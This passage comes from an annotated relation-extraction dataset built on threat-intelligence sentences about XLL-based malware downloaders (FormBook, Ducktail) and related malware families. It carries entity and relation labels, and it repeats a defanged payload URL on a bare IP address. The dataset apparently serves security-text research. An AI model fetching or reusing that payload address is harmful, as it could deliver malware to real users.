10], "name": "hostCommodity", "pos": [10, 11], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [12, 12], "name": "familiesDridex downloaderDridex downloaders", "pos": [12, 15], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [18, 18], "name": "HASH", "pos": [18, 19], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [40, 40], "name": "XLL Formbook downloader", "pos": [1, 4], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [44, 44], "name": "HASH", "pos": [5, 6], "index": "4_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [64, 64], "name": "user", "pos": [2, 3], "index": "5_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [68, 68], "name": "XLL file", "pos": [6, 8], "index": "6_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [73, 73], "name": "downloader", "pos": [11, 12], "index": "7_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [78, 78], "name": "downloader", "pos": [1, 2], "index": "8_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [83, 83], "name": "it", "pos": [6, 7], "index": "9_0"}], [{"type": "SF", "sent_id": 3, "global_pos": [98, 98], "name": "resource", "pos": [21, 22], "index": "10_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [108, 108], "name": "FormBook", "pos": [0, 1], "index": "11_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [113, 113], "name": "f", "pos": [5, 6], "index": "12_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [140, 140], "name": "AgentTesla", "pos": [32, 33], "index": "13_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [142, 142], "name": "Ransomware Stop", "pos": [34, 36], "index": "14_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [145, 145], "name": "Vidar", "pos": [37, 38], "index": "15_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [147, 147], "name": "Buer Loader", "pos": [39, 41], "index": "16_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [150, 150], "name": "Nanocore", "pos": [42, 43], "index": "17_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [152, 152], "name": "IceID", "pos": [44, 45], "index": "18_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [154, 154], "name": "Arkei", "pos": [46, 47], "index": "19_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [156, 156], "name": "AsyncRat", "pos": [48, 49], "index": "20_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [158, 158], "name": "BazarLoader", "pos": [50, 51], "index": "21_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [162, 162], "name": "NET", "pos": [0, 1], "index": "22_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [164, 164], "name": "XLL file", "pos": [2, 4], "index": "23_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [167, 167], "name": "HASH", "pos": [5, 6], "index": "24_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [172, 172], "name": "payload", "pos": [10, 11], "index": "25_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [176, 176], "name": "hxxp : //172.245.120.8/pdfreader.exe", "pos": [14, 17], "index": "26_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [190, 190], "name": "Warzone", "pos": [10, 11], "index": "27_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [192, 192], "name": "HASH", "pos": [12, 13], "index": "28_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [199, 199], "name": "AgentTesla", "pos": [19, 20], "index": "29_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [201, 201], "name": "Lokibot", "pos": [21, 22], "index": "30_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [203, 203], "name": "Ducktail", "pos": [0, 1], "index": "31_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [207, 207], "name": "browser", "pos": [4, 5], "index": "32_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [221, 221], "name": "Facebook", "pos": [18, 19], "index": "33_0"}]], "labels": [{"r": "CO", "evidence": [0], "h": 1, "t": 2}, {"r": "CO", "evidence": [1], "h": 3, "t": 4}, {"r": "CO", "evidence": [1, 2], "h": 3, "t": 6}, {"r": "ST", "evidence": [0, 1, 2], "t": 0, "h": 5}, {"r": "RF", "evidence": [0, 1, 2], "t": 0, "h": 5}, {"r": "FR", "evidence": [2], "h": 5, "t": 7}, {"r": "EX", "evidence": [2], "t": 6, "h": 7}, {"r": "WR", "evidence": [2, 3, 4], "h": 7, "t": 13}, {"r": "WR", "evidence": [2, 3, 4], "h": 7, "t": 14}, {"r": "WR", "evidence": [2, 3, 4], "h": 7, "t": 15}, {"r": "WR", "evidence": [2, 3, 4], "h": 7, "t": 16}, {"r": "WR", "evidence": [2, 3, 4], "h": 7, "t": 17}, {"r": "WR", "evidence": [2, 3, 4], "h": 7, "t": 18}, {"r": "WR", "evidence": [2, 3, 4], "h": 7, "t": 19}, {"r": "WR", "evidence": [2, 3, 4], "h": 7, "t": 20}, {"r": "WR", "evidence": [2, 3, 4], "h": 7, "t": 21}, {"r": "CO", "evidence": [2, 3], "h": 7, "t": 9}, {"r": "CO", "evidence": [2, 3], "h": 7, "t": 8}, {"r": "CO", "evidence": [2, 3, 4], "h": 7, "t": 11}, {"r": "RD", "evidence": [3], "h": 9, "t": 10}, {"r": "RD", "evidence": [4], "h": 11, "t": 12}, {"r": "WR", "evidence": [4, 5], "t": 13, "h": 22}, {"r": "WR", "evidence": [4, 5], "t": 14, "h": 22}, {"r": "WR", "evidence": [4, 5], "t": 15, "h": 22}, {"r": "WR", "evidence": [4, 5], "t": 16, "h": 22}, {"r": "WR", "evidence": [4, 5], "t": 17, "h": 22}, {"r": "WR", "evidence": [4, 5], "t": 18, "h": 22}, {"r": "WR", "evidence": [4, 5], "t": 19, "h": 22}, {"r": "WR", "evidence": [4, 5], "t": 20, "h": 22}, {"r": "WR", "evidence": [4, 5], "t": 21, "h": 22}, {"r": "EX", "evidence": [5], "h": 22, "t": 23}, {"r": "WR", "evidence": [5], "h": 22, "t": 25}, {"r": "ST", "evidence": [5], "h": 22, "t": 26}, {"r": "RF", "evidence": [5], "h": 22, "t": 26}, {"r": "WR", "evidence": [5, 6], "h": 22, "t": 29}, {"r": "WR", "evidence": [5, 6], "h": 22, "t": 30}, {"r": "CO", "evidence": [5], "h": 23, "t": 24}, {"r": "CO", "evidence": [6], "h": 27, "t": 28}, {"r": "WR", "evidence": [6, 7], "t": 29, "h": 31}, {"r": "WR", "evidence": [6, 7], "t": 30, "h": 31}, {"r": "RD", "evidence": [7], "h": 31, "t": 32}, {"r": "RD", "evidence": [7], "h": 31, "t": 33}]}, {"title": "607-45", "sents": [["The", "XLL", "Formbook", "downloader", ",", "HASH", ",", "arrives", "in", "an", "email", "masquerading", "as", "an", "invoice", "sent", "from", "a", "company", "to", "the", "user", "."], ["When", "the", "user", "opens", "the", "attached", "XLL", "file", ",", "the", "malicious", "downloader", "is", "launched", "."], ["The", "downloader", "is", "rather", "simple", "and", "it", "enumerates", "the", "resource", "section", "of", "the", "file", "in", "a", "search", "for", "a", "specific", "string", "resource", "which", "contains", "the", "URL", "of", "the", "FormBook", "payload", "."], ["FormBook", "finds", "the", "resource", "``", "f", "''", "which", "contains", "the", "payload", "URLOther", "notable", "commodity", "malware", "families", "that", "use", "XLLs", "as", "the", "infection", "vector", "and", "are", "not", "specifically", "described", "in", "this", "post", "include", "AgentTesla", ",", "Ransomware", "Stop", ",", "Vidar", ",", "Buer", "Loader", ",", "Nanocore", ",", "IceID", ",", "Arkei", ",", "AsyncRat", ",", "BazarLoader", "and", "others", "."], ["NET", "based", "XLL", "file", ",", "HASH", ",", "that", "downloads", "the", "payload", "from", "the", "URL", "hxxp", ":", "//172.245.120.8/pdfreader.exe", "."], ["At", "the", "time", "of", "analysis", ",", "the", "URL", "hosted", "the", "Warzone", "payload", "HASH", ",", "and", "later", "hosted", "samples", "of", "AgentTesla", "and", "Lokibot", "."], ["Ducktail", "attempts", "to", "steal", "browser", "stored", "credentials", "and", "cookies", "with", "the", "specific", "intent", "to", "steal", "the", "details", "of", "Facebook", "friends", "and", "business", "contacts", "."], ["The", "threat", "actor", "uses", "their", "gained", "access", "to", "run", "ads", "for", "monetary", "gain", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [1, 1], "name": "XLL Formbook downloader", "pos": [1, 4], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [5, 5], "name": "HASH", "pos": [5, 6], "index": "1_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [25, 25], "name": "user", "pos": [2, 3], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [29, 29], "name": "XLL file", "pos": [6, 8], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [34, 34], "name": "downloader", "pos": [11, 12], "index": "4_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [39, 39], "name": "downloader", "pos": [1, 2], "index": "5_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [44, 44], "name": "it", "pos": [6, 7], "index": "6_0"}], [{"type": "SF", "sent_id": 2, "global_pos": [59, 59], "name": "resource", "pos": [21, 22], "index": "7_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [69, 69], "name": "FormBook", "pos": [0, 1], "index": "8_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [74, 74], "name": "f", "pos": [5, 6], "index": "9_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [101, 101], "name": "AgentTesla", "pos": [32, 33], "index": "10_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [103, 103], "name": "Ransomware Stop", "pos": [34, 36], "index": "11_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [106, 106], "name": "Vidar", "pos": [37, 38], "index": "12_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [108, 108], "name": "Buer Loader", "pos": [39, 41], "index": "13_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [111, 111], "name": "Nanocore", "pos": [42, 43], "index": "14_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [113, 113], "name": "IceID", "pos": [44, 45], "index": "15_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [115, 115], "name": "Arkei", "pos": [46, 47], "index": "16_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [117, 117], "name": "AsyncRat", "pos": [48, 49], "index": "17_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [119, 119], "name": "BazarLoader", "pos": [50, 51], "index": "18_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [123, 123], "name": "NET", "pos": [0, 1], "index": "19_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [125, 125], "name": "XLL file", "pos": [2, 4], "index": "20_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [128, 128], "name": "HASH", "pos": [5, 6], "index": "21_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [133, 133], "name": "payload", "pos": [10, 11], "index": "22_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [137, 137], "name": "hxxp : //172.245.120.8/pdfreader.exe", "pos": [14, 17], "index": "23_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [151, 151], "name": "Warzone", "pos": [10, 11], "index": "24_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [153, 153], "name": "HASH", "pos": [12, 13], "index": "25_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [160, 160], "name": "AgentTesla", "pos": [19, 20], "index": "26_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [162, 162], "name": "Lokibot", "pos": [21, 22], "index": "27_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [164, 164], "name": "Ducktail", "pos": [0, 1], "index": "28_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [168, 168], "name": "browser", "pos": [4, 5], "index": "29_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [182, 182], "name": "Facebook", "pos": [18, 19], "index": "30_0"}]], "labels": [{"r": "CO", "evidence": [0], "h": 0, "t": 1}, {"r": "CO", "evidence": [0, 1], "h": 0, "t": 3}, {"r": "FR", "evidence": [1], "h": 2, "t": 4}, {"r": "EX", "evidence": [1], "t": 3, "h": 4}, {"r": "WR", "evidence": [1, 2, 3], "h": 4, "t": 10}, {"r": "WR", "evidence": [1, 2, 3], "h": 4, "t": 11}, {"r": "WR", "evidence": [1, 2, 3], "h": 4, "t": 12}, {"r": "WR", "evidence": [1, 2, 3], "h": 4, "t": 13}, {"r": "WR", "evidence": [1, 2, 3], "h": 4, "t": 14}, {"r": "WR", "evidence": [1, 2, 3], "h": 4, "t": 15}, {"r": "WR", "evidence": [1, 2, 3], "h": 4, "t": 16}, {"r": "WR", "evidence": [1, 2, 3], "h": 4, "t": 17}, {"r": "WR", "evidence": [1, 2, 3], "h": 4, "t": 18}, {"r": "CO", "evidence": [1, 2], "h": 4, "t": 6}, {"r": "CO", "evidence": [1, 2], "h": 4, "t": 5}, {"r": "CO", "evidence": [1, 2, 3], "h": 4, "t": 8}, {"r": "RD", "evidence": [2], "h": 6, "t": 7}, {"r": "RD", "evidence": [3], "h": 8, "t": 9}, {"r": "WR", "evidence": [3, 4], "t": 10, "h": 19}, {"r": "WR", "evidence": [3, 4], "t": 11, "h": 19}, {"r": "WR", "evidence": [3, 4], "t": 12, "h": 19}, {"r": "WR", "evidence": [3, 4], "t": 13, "h": 19}, {"r": "WR", "evidence": [3, 4], "t": 14, "h": 19}, {"r": "WR", "evidence": [3, 4], "t": 15, "h": 19}, {"r": "WR", "evidence": [3, 4], "t": 16, "h": 19}, {"r": "WR", "evidence": [3, 4], "t": 17, "h": 19}, {"r": "WR", "evidence": [3, 4], "t": 18, "h": 19}, {"r": "EX", "evidence": [4], "h": 19, "t": 20}, {"r": "WR", "evidence": [4], "h": 19, "t": 22}, {"r": "ST", "evidence": [4], "h": 19, "t": 23}, {"r": "RF", "evidence": [4], "h": 19, "t": 23}, {"r": "WR", "evidence": [4, 5], "h": 19, "t": 26}, {"r": "WR", "evidence": [4, 5], "h": 19, "t": 27}, {"r": "CO", "evidence": [4], "h": 20, "t": 21}, {"r": "CO", "evidence": [5], "h": 24, "t": 25}, {"r": "WR", "evidence": [5, 6], "t": 26, "h": 28}, {"r": "WR", "evidence": [5, 6], "t": 27, "h": 28}, {"r": "RD", "evidence": [6], "h": 28, "t": 29}, {"r": "RD", "evidence": [6], "h": 28, "t": 30}]}, {"title": "607-46", "sents": [["When", "the", "user", "opens", "the", "attached", "XLL", "file", ",", "the", "malicious", "downloader", "is", "launched", "."], ["The", "downloader", "is", "rather", "simple", "and", "it", "enumerates", "the", "resource", "section", "of", "the", "file", "in", "a", "search", "for", "a", "specific", "string", "resource", "which", "contains", "the", "URL", "of", "the", "FormBook", "payload", "."], ["FormBook", "finds", "the", "resource", "``", "f", "''", "which", "contains", "the", "payload", "URLOther", "notable", "commodity", "malware", "families", "that", "use", "XLLs", "as", "the", "infection", "vector", "and", "are", "not", "specifically", "described", "in", "this", "post", "include", "AgentTesla", ",", "Ransomware", "Stop", ",", "Vidar", ",", "Buer", "Loader", ",", "Nanocore", ",", "IceID", ",", "Arkei", ",", "AsyncRat", ",", "BazarLoader", "and", "others", "."], ["NET", "based", "XLL", "file", ",", "HASH", ",", "that", "downloads", "the", "payload", "from", "the", "URL", "hxxp", ":", "//172.245.120.8/pdfreader.exe", "."], ["At", "the", "time", "of", "analysis", ",", "the", "URL", "hosted", "the", "Warzone", "payload", "HASH", ",", "and", "later", "hosted", "samples", "of", "AgentTesla", "and", "Lokibot", "."], ["Ducktail", "attempts", "to", "steal", "browser", "stored", "credentials", "and", "cookies", "with", "the", "specific", "intent", "to", "steal", "the", "details", "of", "Facebook", "friends", "and", "business", "contacts", "."], ["The", "threat", "actor", "uses", "their", "gained", "access", "to", "run", "ads", "for", "monetary", "gain", "."], ["The", "second", "stage", "of", "the", "Ducktail", "downloader", "is", "stored", "as", "AES", "encrypted", "Base32", "encoded", "blobThe", "Ducktail", "stealer", "payload", "is", "shared", "using", "large", "(", "over", "100", "MB", ")", "compressed", "archives", "containing", "a", "number", "of", "legitimate", "resources", "as", "well", "as", "malicious", "files", "."]], "vertexSet": [[{"type": "TP", "sent_id": 0, "global_pos": [2, 2], "name": "user", "pos": [2, 3], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [6, 6], "name": "XLL file", "pos": [6, 8], "index": "1_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [11, 11], "name": "downloader", "pos": [11, 12], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [16, 16], "name": "downloader", "pos": [1, 2], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [21, 21], "name": "it", "pos": [6, 7], "index": "4_0"}], [{"type": "SF", "sent_id": 1, "global_pos": [36, 36], "name": "resource", "pos": [21, 22], "index": "5_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [46, 46], "name": "FormBook", "pos": [0, 1], "index": "6_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [51, 51], "name": "f", "pos": [5, 6], "index": "7_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [78, 78], "name": "AgentTesla", "pos": [32, 33], "index": "8_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [80, 80], "name": "Ransomware Stop", "pos": [34, 36], "index": "9_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [83, 83], "name": "Vidar", "pos": [37, 38], "index": "10_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [85, 85], "name": "Buer Loader", "pos": [39, 41], "index": "11_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [88, 88], "name": "Nanocore", "pos": [42, 43], "index": "12_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [90, 90], "name": "IceID", "pos": [44, 45], "index": "13_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [92, 92], "name": "Arkei", "pos": [46, 47], "index": "14_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [94, 94], "name": "AsyncRat", "pos": [48, 49], "index": "15_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [96, 96], "name": "BazarLoader", "pos": [50, 51], "index": "16_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [100, 100], "name": "NET", "pos": [0, 1], "index": "17_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [102, 102], "name": "XLL file", "pos": [2, 4], "index": "18_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [105, 105], "name": "HASH", "pos": [5, 6], "index": "19_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [110, 110], "name": "payload", "pos": [10, 11], "index": "20_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [114, 114], "name": "hxxp : //172.245.120.8/pdfreader.exe", "pos": [14, 17], "index": "21_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [128, 128], "name": "Warzone", "pos": [10, 11], "index": "22_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [130, 130], "name": "HASH", "pos": [12, 13], "index": "23_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [137, 137], "name": "AgentTesla", "pos": [19, 20], "index": "24_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [139, 139], "name": "Lokibot", "pos": [21, 22], "index": "25_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [141, 141], "name": "Ducktail", "pos": [0, 1], "index": "26_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [145, 145], "name": "browser", "pos": [4, 5], "index": "27_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [159, 159], "name": "Facebook", "pos": [18, 19], "index": "28_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [184, 184], "name": "Ducktail downloader", "pos": [5, 7], "index": "29_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [193, 193], "name": "blobThe", "pos": [14, 15], "index": "30_0"}]], "labels": [{"r": "FR", "evidence": [0], "h": 0, "t": 2}, {"r": "EX", "evidence": [0], "t": 1, "h": 2}, {"r": "WR", "evidence": [0, 1, 2], "h": 2, "t": 8}, {"r": "WR", "evidence": [0, 1, 2], "h": 2, "t": 9}, {"r": "WR", "evidence": [0, 1, 2], "h": 2, "t": 10}, {"r": "WR", "evidence": [0, 1, 2], "h": 2, "t": 11}, {"r": "WR", "evidence": [0, 1, 2], "h": 2, "t": 12}, {"r": "WR", "evidence": [0, 1, 2], "h": 2, "t": 13}, {"r": "WR", "evidence": [0, 1, 2], "h": 2, "t": 14}, {"r": "WR", "evidence": [0, 1, 2], "h": 2, "t": 15}, {"r": "WR", "evidence": [0, 1, 2], "h": 2, "t": 16}, {"r": "CO", "evidence": [0, 1], "h": 2, "t": 4}, {"r": "CO", "evidence": [0, 1], "h": 2, "t": 3}, {"r": "CO", "evidence": [0, 1, 2], "h": 2, "t": 6}, {"r": "RD", "evidence": [1], "h": 4, "t": 5}, {"r": "RD", "evidence": [2], "h": 6, "t": 7}, {"r": "WR", "evidence": [2, 3], "t": 8, "h": 17}, {"r": "WR", "evidence": [2, 3], "t": 9, "h": 17}, {"r": "WR", "evidence": [2, 3], "t": 10, "h": 17}, {"r": "WR", "evidence": [2, 3], "t": 11, "h": 17}, {"r": "WR", "evidence": [2, 3], "t": 12, "h": 17}, {"r": "WR", "evidence": [2, 3], "t": 13, "h": 17}, {"r": "WR", "evidence": [2, 3], "t": 14, "h": 17}, {"r": "WR", "evidence": [2, 3], "t": 15, "h": 17}, {"r": "WR", "evidence": [2, 3], "t": 16, "h": 17}, {"r": "EX", "evidence": [3], "h": 17, "t": 18}, {"r": "WR", "evidence": [3], "h": 17, "t": 20}, {"r": "ST", "evidence": [3], "h": 17, "t": 21}, {"r": "RF", "evidence": [3], "h": 17, "t": 21}, {"r": "WR", "evidence": [3, 4], "h": 17, "t": 24}, {"r": "WR", "evidence": [3, 4], "h": 17, "t": 25}, {"r": "CO", "evidence": [3], "h": 18, "t": 19}, {"r": "CO", "evidence": [4], "h": 22, "t": 23}, {"r": "WR", "evidence": [4, 5], "t": 24, "h": 26}, {"r": "WR", "evidence": [4, 5], "t": 25, "h": 26}, {"r": "RD", "evidence": [5], "h": 26, "t": 27}, {"r": "RD", "evidence": [5], "h": 26, "t": 28}, {"r": "CO", "evidence": [5, 6, 7], "h": 26, "t": 29}, {"r": "WR", "evidence": [7], "h": 29, "t": 30}]}, {"title": "607-47", "sents": [["The", "downloader", "is", "rather", "simple", "and", "it", "enumerates", "the", "resource", "section", "of", "the", "file", "in", "a", "search", "for", "a", "specific", "string", "resource", "which", "contains", "the", "URL", "of", "the", "FormBook", "payload", "."], ["FormBook", "finds", "the", "resource", "``", "f", "''", "which", "contains", "the", "payload", "URLOther", "notable", "commodity", "malware", "families", "that", "use", "XLLs", "as", "the", "infection", "vector", "and", "are", "not", "specifically", "described", "in", "this", "post", "include", "AgentTesla", ",", "Ransomware", "Stop", ",", "Vidar", ",", "Buer", "Loader", ",", "Nanocore", ",", "IceID", ",", "Arkei", ",", "AsyncRat", ",", "BazarLoader", "and", "others", "."], ["NET", "based", "XLL", "file", ",", "HASH", ",", "that", "downloads", "the", "payload", "from", "the", "URL", "hxxp", ":", "//172.245.120.8/pdfreader.exe", "."], ["At", "the", "time", "of", "analysis", ",", "the", "URL", "hosted", "the", "Warzone", "payload", "HASH", ",", "and", "later", "hosted", "samples", "of", "AgentTesla", "and", "Lokibot", "."], ["Ducktail", "attempts", "to", "steal", "browser", "stored", "credentials", "and", "cookies", "with", "the", "specific", "intent", "to", "steal", "the", "details", "of", "Facebook", "friends", "and", "business", "contacts", "."], ["The", "threat", "actor", "uses", "their", "gained", "access", "to", "run", "ads", "for", "monetary", "gain", "."], ["The", "second", "stage", "of", "the", "Ducktail", "downloader", "is", "stored", "as", "AES", "encrypted", "Base32", "encoded", "blobThe", "Ducktail", "stealer", "payload", "is", "shared", "using", "large", "(", "over", "100", "MB", ")", "compressed", "archives", "containing", "a", "number", "of", "legitimate", "resources", "as", "well", "as", "malicious", "files", "."], ["The", "Base32", "encoded", "blob", "is", "decoded", "and", "loaded", "using", "reflectionThe", "file", "is", "created", "using", "Excel-DNA", "and", "contains", "a", "Base32", "encoded", "and", "encrypted", "data", "blob", "which", "gets", "loaded", "into", "the", "process", "space", "of", "Explorer", "using", "reflection", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "downloader", "pos": [1, 2], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [6, 6], "name": "it", "pos": [6, 7], "index": "1_0"}], [{"type": "SF", "sent_id": 0, "global_pos": [21, 21], "name": "resource", "pos": [21, 22], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [31, 31], "name": "FormBook", "pos": [0, 1], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [36, 36], "name": "f", "pos": [5, 6], "index": "4_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [63, 63], "name": "AgentTesla", "pos": [32, 33], "index": "5_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [65, 65], "name": "Ransomware Stop", "pos": [34, 36], "index": "6_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [68, 68], "name": "Vidar", "pos": [37, 38], "index": "7_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [70, 70], "name": "Buer Loader", "pos": [39, 41], "index": "8_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [73, 73], "name": "Nanocore", "pos": [42, 43], "index": "9_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [75, 75], "name": "IceID", "pos": [44, 45], "index": "10_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [77, 77], "name": "Arkei", "pos": [46, 47], "index": "11_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [79, 79], "name": "AsyncRat", "pos": [48, 49], "index": "12_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [81, 81], "name": "BazarLoader", "pos": [50, 51], "index": "13_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [85, 85], "name": "NET", "pos": [0, 1], "index": "14_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [87, 87], "name": "XLL file", "pos": [2, 4], "index": "15_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [90, 90], "name": "HASH", "pos": [5, 6], "index": "16_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [95, 95], "name": "payload", "pos": [10, 11], "index": "17_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [99, 99], "name": "hxxp : //172.245.120.8/pdfreader.exe", "pos": [14, 17], "index": "18_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [113, 113], "name": "Warzone", "pos": [10, 11], "index": "19_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [115, 115], "name": "HASH", "pos": [12, 13], "index": "20_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [122, 122], "name": "AgentTesla", "pos": [19, 20], "index": "21_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [124, 124], "name": "Lokibot", "pos": [21, 22], "index": "22_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [126, 126], "name": "Ducktail", "pos": [0, 1], "index": "23_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [130, 130], "name": "browser", "pos": [4, 5], "index": "24_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [144, 144], "name": "Facebook", "pos": [18, 19], "index": "25_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [169, 169], "name": "Ducktail downloader", "pos": [5, 7], "index": "26_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [178, 178], "name": "blobThe", "pos": [14, 15], "index": "27_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [208, 208], "name": "blob", "pos": [3, 4], "index": "28_0"}]], "labels": [{"r": "RD", "evidence": [0], "h": 1, "t": 2}, {"r": "RD", "evidence": [1], "h": 3, "t": 4}, {"r": "WR", "evidence": [1, 2], "t": 5, "h": 14}, {"r": "WR", "evidence": [1, 2], "t": 6, "h": 14}, {"r": "WR", "evidence": [1, 2], "t": 7, "h": 14}, {"r": "WR", "evidence": [1, 2], "t": 8, "h": 14}, {"r": "WR", "evidence": [1, 2], "t": 9, "h": 14}, {"r": "WR", "evidence": [1, 2], "t": 10, "h": 14}, {"r": "WR", "evidence": [1, 2], "t": 11, "h": 14}, {"r": "WR", "evidence": [1, 2], "t": 12, "h": 14}, {"r": "WR", "evidence": [1, 2], "t": 13, "h": 14}, {"r": "EX", "evidence": [2], "h": 14, "t": 15}, {"r": "WR", "evidence": [2], "h": 14, "t": 17}, {"r": "ST", "evidence": [2], "h": 14, "t": 18}, {"r": "RF", "evidence": [2], "h": 14, "t": 18}, {"r": "WR", "evidence": [2, 3], "h": 14, "t": 21}, {"r": "WR", "evidence": [2, 3], "h": 14, "t": 22}, {"r": "CO", "evidence": [2], "h": 15, "t": 16}, {"r": "CO", "evidence": [3], "h": 19, "t": 20}, {"r": "WR", "evidence": [3, 4], "t": 21, "h": 23}, {"r": "WR", "evidence": [3, 4], "t": 22, "h": 23}, {"r": "RD", "evidence": [4], "h": 23, "t": 24}, {"r": "RD", "evidence": [4], "h": 23, "t": 25}, {"r": "CO", "evidence": [4, 5, 6], "h": 23, "t": 26}, {"r": "WR", "evidence": [6], "h": 26, "t": 27}, {"r": "FR", "evidence": [6, 7], "h": 26, "t": 28}, {"r": "EX", "evidence": [6, 7], "t": 27, "h": 28}]}, {"title": "607-48", "sents": [["FormBook", "finds", "the", "resource", "``", "f", "''", "which", "contains", "the", "payload", "URLOther", "notable", "commodity", "malware", "families", "that", "use", "XLLs", "as", "the", "infection", "vector", "and", "are", "not", "specifically", "described", "in", "this", "post", "include", "AgentTesla", ",", "Ransomware", "Stop", ",", "Vidar", ",", "Buer", "Loader", ",", "Nanocore", ",", 